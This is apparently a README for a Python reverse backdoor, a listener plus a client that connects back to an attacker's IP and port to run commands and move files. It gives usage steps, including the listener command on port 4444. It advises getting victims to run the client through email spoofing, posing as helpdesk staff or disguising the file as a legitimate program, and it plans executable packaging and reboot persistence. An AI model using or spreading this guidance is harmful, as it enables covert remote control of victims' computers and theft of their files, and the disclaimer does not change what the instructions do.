# Python Reverse Backdoor

A Python-based reverse backdoor consisting of two components: a listener (server) and a reverse backdoor (client). Designed for educational purposes to demonstrate socket programming and remote command execution.
This program will run if both machines have a python interperter installed. 
You will have to use social engineering tactics to get the target to execute the reverse_backdoor python file on their computer. This can be done by using email spoofing, pretending to be a helpdesk techincian, or some other elaborate way. 
It is also possible to package the python file into an executable file that will run on a Windows machine without a python interpreter. Something to work on in the future. 

**Disclaimer**: Use this tool only in legal, authorized environments. Unauthorized access to computer systems is illegal and unethical. The developers assume no liability for misuse.

## Features

### Listener (Host)
- Listens for incoming connections from the target.
- Execute remote commands on the target machine.
- Upload/download files to/from the target.
- Persistent connection until manually terminated.

### Reverse Backdoor (Target)
- Connects back to the listener's IP and port.
- Supports commands: `cd`, `download`, `upload`, `exit`, and system commands (e.g., `ls`, `whoami`).
- Encodes files in base64 for transfer.

---

## Prerequisites

- Python 3 installed on both host and target machines.
- Host machine must allow incoming connections on the specified port.
- The target machine must execute the backdoor script.

---

## Usage

### 1. Configure the Backdoor
Edit `reverse_backdoor.py` to point to the listener's IP and port:
```bash
my_backdoor = Backdoor("LISTENER_IP", LISTENER_PORT)  # Replace with your listener's IP/port
```
### 2. Run the Listener
On the host machine:

```bash
python3 listener.py 0.0.0.0 4444
```
- 0.0.0.0 binds to all network interfaces.
- Ensure the port (e.g., 4444) is open and accessible.

### 3. Transfer the Backdoor to the Target
Use social engineering tactics (e.g., disguising the file as a legitimate program) to run reverse_backdoor.py on the target. Example:
```bash
python3 reverse_backdoor.py
```

### 4. Execute Commands
Once connected, use these commands in the listener:
- System Commands
```bash
>> ls -la
>> whoami
```

- Change Directory
```bash
>> cd /path/to/directory
```

- Download File
```bash
>> download file.txt
```

- Upload File
```bash
>> upload /path/to/local/file.txt
```

- Exit
```bash
>> exit
```

## File Structure
- listener.py
Run on the host machine. Listens for incoming connections and sends commands.

- reverse_backdoor.py
Run on the target machine. Connects to the listener and executes commands.

## Important Notes
üîí Encode/Decode: Files are base64-encoded during transfer to avoid corruption.

‚ö†Ô∏è Firewall: Disable firewalls or configure port forwarding if connections fail.

üõë Ethics: Obtain explicit permission before testing on any network or device.

## Future Improvements
- Convert reverse_backdoor.py into a standalone executable (e.g., .exe for Windows) using PyInstaller.

- Implement encryption for secure command transmission.

- Add persistence techniques to maintain access after reboot.

- Improve error handling and logging.
